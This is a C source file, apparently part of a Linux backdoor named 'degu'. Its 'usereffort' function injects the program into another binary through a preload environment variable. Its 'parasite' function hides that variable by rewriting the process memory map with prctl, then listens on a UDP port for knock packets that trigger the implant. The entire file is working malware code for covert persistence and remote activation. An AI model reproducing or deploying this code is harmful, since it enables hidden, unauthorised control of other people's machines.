#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <arpa/inet.h>

#include "degu.h"
#include "injector.h"


static int isexecok(const char *filename) {
    if (access(filename, F_OK|X_OK) != -1) {
        return 1;
    } else {
        return 0;
    }
}

void usereffort(int port,char *bin){
    if (isexecok(bin) == 1){
        TRACE("user effort %i %s",port,bin);
        char dso[2048] =  {0};
        readlink("/proc/self/exe",dso,2048);

        char preload[4096] = {0};
        char eport[512] = {0};
        sprintf(preload,"%s=%s",PRELOAD,dso);
        sprintf(eport,"%s=%i",PORT,port);
        char **env = (char **)malloc(3 * sizeof(char *));
        if(!env ){
            printf("unable to malloc environ \n");    
            exit(-105);     
        }
        env[0] = preload;
        env[1] = eport;
        env[2] = NULL;
        execle(bin,bin,NULL,env);
    } else {
        printf("? %s\n",bin);
        exit(-105); 
    }
}

static int get_mm_map(const char *filename, struct  prctl_mm_map *m) {
    
    const char fmt[] =
              "%*d " // (1) pid 
              "%*s " // (2) comm 
              "%*c " // (3) state 
              "%*d " // (4) ppid 
              "%*d " // (5) pgrp 
              "%*d " // (6) session 
              "%*d " // (7) tty_nr 
              "%*d " // (8) tpgid 
              "%*u " // (9) flags 
              "%*u " // "%lu"  // (10) minflt 
              "%*u " // "%lu"  // (11) cminflt 
              "%*u " // "%lu"  // (12) majflt 
              "%*u " // "%lu"  // (13) cmajflt 
              "%*u " // "%lu"  // (14) utime 
              "%*u " // "%lu"  // (15) stime 
              "%*d " // "%ld"  // (16) cutime 
              "%*d " // "%ld"  // (17) cstime 
              "%*d " // "%ld"  // (18) priority 
              "%*d " // "%ld"  // (19) nice 
              "%*d " // "%ld"  // (20) num_threads 
              "%*d " // "%ld"  // (21) itrealvalue 
              "%*u " // "%llu"  // (22) starttime 
              "%*u " // "%lu"  // (23) vsize 
              "%*d " // "%ld"  // (24) rss 
              "%*u " // "%lu"  // (25) rsslim 
    /* 0 */   "%lu " // (26) start_code  [PT]
    /* 1 */   "%lu " // (27) end_code  [PT]
    /* 2 */   "%lu " // (28) start_stack  [PT]
              "%*u " // "%lu"  // (29) kstkesp  [PT]
              "%*u " // "%lu"  // (30) kstkeip  [PT]
              "%*u " // "%lu"  // (31) signal 
              "%*u " // "%lu"  // (32) blocked 
              "%*u " // "%lu"  // (33) sigignore 
              "%*u " // "%lu"  // (34) sigcatch 
              "%*u " // "%lu"  // (35) wchan  [PT]
              "%*u " // "%lu"  // (36) nswap 
              "%*u " // "%lu"  // (37) cnswap 
              "%*d " // (38) exit_signal  (since Linux 2.1.22)
              "%*d " // (39) processor  (since Linux 2.2.8)
              "%*u " // (40) rt_priority  (since Linux 2.5.19)
              "%*u " // (41) policy  (since Linux 2.5.19)
              "%*u " // "%llu"  // (42) delayacct_blkio_ticks  (since Linux 2.6.18)
              "%*u " // "%lu"  // (43) guest_time  (since Linux 2.6.24)
              "%*d " // "%ld"  // (44) cguest_time  (since Linux 2.6.24)
    /* 3 */   "%lu " // (45) start_data  (since Linux 3.3)  [PT]
    /* 4 */   "%lu " // (46) end_data  (since Linux 3.3)  [PT]
    /* 5 */   "%lu " // (47) start_brk  (since Linux 3.3)  [PT]
    /* 6 */   "%lu " // (48) arg_start  (since Linux 3.5)  [PT]
    /* 7 */   "%lu " // (49) arg_end  (since Linux 3.5)  [PT]
    /* 8 */   "%lu " // (50) env_start  (since Linux 3.5)  [PT]
    /* 9 */   "%lu " // (51) env_end  (since Linux 3.5)  [PT]
              "%*d" // (52) exit_code  (since Linux 3.5)  [PT]
              ;

    unsigned long start_code, end_code, start_stack, start_data, end_data,
                  start_brk, arg_start, arg_end, env_start, env_end;


    FILE *f = fopen(filename, "r");
    if (!f) {
        TRACE("unable to open %s",filename);
        return -1;
    }
    int r = fscanf(f, fmt,
                &start_code, &end_code, &start_stack,
                &start_data, &end_data, &start_brk,
                &arg_start, &arg_end, &env_start, &env_end);
    
    fclose(f);
    
    if (r != 10) {
        TRACE("parsing %s failed\n",filename);
        return -1;
    }

    uintptr_t brk = (uintptr_t) sbrk(0);

    
    *m = (struct prctl_mm_map){0};

    m->start_code  = start_code;
    m->end_code    = end_code;
    m->start_data  = start_data;
    m->end_data    = end_data;
    m->start_brk   = start_brk;
    m->brk         = brk;
    m->start_stack = start_stack;
    m->arg_start   = arg_start;
    m->arg_end     = arg_end;
    m->env_start   = env_start;
    m->env_end     = env_end;
    m->auxv_size   = 0;
    m->exe_fd      = -1;
    
    return 0;
}

static void cleandeguenv(){
    char filename[256];
    snprintf(filename, sizeof filename - 1, "/proc/%d/stat", getpid());

    struct  prctl_mm_map m;
    int r = get_mm_map(filename, &m);
    if (r)
        return ;
    
    m.env_end   = (uintptr_t)m.env_start;
    r = prctl(PR_SET_MM, PR_SET_MM_MAP, (unsigned long) &m, sizeof m, 0);
    if (r == -1) {
        TRACE("prctl error");
        return ;
    }
}

void parasite(int port, int clean){
    TRACE("inside parasite %i",port);

    if (clean == 1)
        cleandeguenv();
    unsetenv(PRELOAD);


    if ( (port == 53) && (getuid()==0)  ){
        signal(SIGALRM,sig_alrm);
        alarm(WAKE);
        setup_keys();
        for(;;){
            sleep(1);
        }
        exit(EXIT_SUCCESS);
    }


    struct sockaddr_in saddr, caddr;
    socklen_t clen = sizeof(caddr);
    setup_keys();
    int ssock;
    if ((ssock = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        exit(EXIT_FAILURE);
    }
    
    memset(&saddr, 0, sizeof(saddr));
    saddr.sin_family = AF_INET;
    saddr.sin_addr.s_addr = INADDR_ANY;
    saddr.sin_port = htons(port);
    
    if (bind(ssock, (struct sockaddr *)&saddr, sizeof(saddr)) == -1) {
        TRACE("udp listen on %i error",port);
        close(ssock);
        exit(EXIT_FAILURE);
    }
    
    unsigned char buffer[1500];

    while (1) {
        memset(buffer,0,1500);
        unsigned char *towrite = buffer + STRIPUDP;
        int i = recvfrom(ssock, towrite, 1500 - STRIPUDP , 0, (struct sockaddr *)&caddr, &clen);
        TRACE("recv %i ",i);
        knock(buffer,i+STRIPUDP);
    }
    exit(EXIT_SUCCESS);
}